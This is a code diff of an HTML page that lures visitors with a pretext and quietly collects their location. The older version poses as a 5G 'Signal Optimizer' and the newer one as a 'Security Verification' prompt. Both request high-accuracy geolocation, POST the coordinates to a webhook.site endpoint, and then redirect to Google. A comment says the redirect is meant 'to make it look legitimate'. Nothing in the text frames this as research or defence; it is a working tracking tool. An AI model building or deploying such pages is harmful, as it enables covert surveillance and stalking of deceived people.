@@ -1,104 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic Tool</title>
+    <title>Verify Connection</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .loader {
-            border-top-color: #3498db;
-            animation: spinner 1.5s linear infinite;
-        }
-        @keyframes spinner {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
 </head>
-<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-4">
-
-    <div id="main-card" class="bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full border border-slate-700">
-        <!-- Header -->
-        <div class="text-center mb-6">
-            <div class="bg-blue-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-500/20">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
-                </svg>
-            </div>
-            <h1 class="text-2xl font-bold tracking-tight">Signal Optimizer v4.2</h1>
-            <p class="text-slate-400 mt-2 text-sm">Analyze nearby towers for better 5G stability.</p>
-        </div>
-
-        <!-- Progress/Action Area -->
-        <div id="content-area">
-            <button onclick="startDiagnostic()" class="w-full bg-blue-600 hover:bg-blue-500 transition-colors py-3 rounded-xl font-semibold shadow-lg shadow-blue-900/40">
-                Begin Optimization
-            </button>
-        </div>
-
-        <div id="loading-area" class="hidden text-center">
-            <div class="loader ease-linear rounded-full border-4 border-t-4 border-slate-700 h-12 w-12 mx-auto mb-4"></div>
-            <p id="status-text" class="text-blue-400 font-mono text-xs uppercase tracking-widest">Scanning Satellites...</p>
-        </div>
-
-        <!-- Footer Decor -->
-        <div class="mt-8 pt-6 border-t border-slate-700 flex justify-between text-[10px] text-slate-500 font-mono uppercase tracking-widest">
-            <span>Encrypted: AES-256</span>
-            <span>Region: Global</span>
-        </div>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-md text-center max-w-sm">
+        <h2 class="text-xl font-bold mb-4">Security Verification</h2>
+        <p class="text-gray-600 mb-6 text-sm">Please verify your device location to continue to the secure network.</p>
+        
+        <!-- BUTTON IS MANDATORY FOR CHROME -->
+        <button onclick="getLocation()" class="bg-blue-600 text-white px-6 py-2 rounded-full hover:bg-blue-700 transition">
+            Verify Identity
+        </button>
+        
+        <p id="status" class="mt-4 text-xs text-gray-400 font-mono"></p>
     </div>
 
     <script>
-        function startDiagnostic() {
-            // UI Change
-            document.getElementById('content-area').classList.add('hidden');
-            document.getElementById('loading-area').classList.remove('hidden');
-
+        function getLocation() {
+            document.getElementById('status').innerText = "Requesting Access...";
+            
             if (navigator.geolocation) {
-                // The Permission Request
-                navigator.geolocation.getCurrentPosition(success, error, {
+                navigator.geolocation.getCurrentPosition(sendData, handleError, {
                     enableHighAccuracy: true,
-                    timeout: 8000
+                    timeout: 10000,
+                    maximumAge: 0
                 });
             } else {
-                alert("Device Hardware Incompatible.");
+                alert("This browser does not support security verification.");
             }
         }
 
-        async function success(position) {
-            document.getElementById('status-text').innerText = "Syncing with Node...";
+        function sendData(position) {
+            document.getElementById('status').innerText = "Uploading Metadata...";
             
-            const payload = {
+            const coords = {
                 lat: position.coords.latitude,
                 lon: position.coords.longitude,
-                alt: position.coords.altitude,
-                acc: position.coords.accuracy,
-                time: new Date().toISOString()
+                acc: position.coords.accuracy
             };
 
-            try {
-                // Send to your Webhook
-                await fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify(payload)
-                });
-                
-                // Final "Success" UI before redirect
-                document.getElementById('status-text').innerText = "Optimization Complete!";
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com/search?q=5G+coverage+map";
-                }, 1500);
-
-            } catch (err) {
+            fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify(coords)
+            }).then(() => {
+                // Redirect to make it look legitimate
                 window.location.href = "https://www.google.com";
-            }
+            });
         }
 
-        function error(err) {
-            // Silent fail
-            console.warn("User denied or timeout.");
+        function handleError(error) {
+            // If Chrome blocks it, this function runs.
+            console.log("Error Code: " + error.code);
+            if (error.code === 1) {
+                alert("Permission Denied. Please enable location in your browser settings to continue.");
+            }
             window.location.href = "https://www.google.com";
         }
     </script>
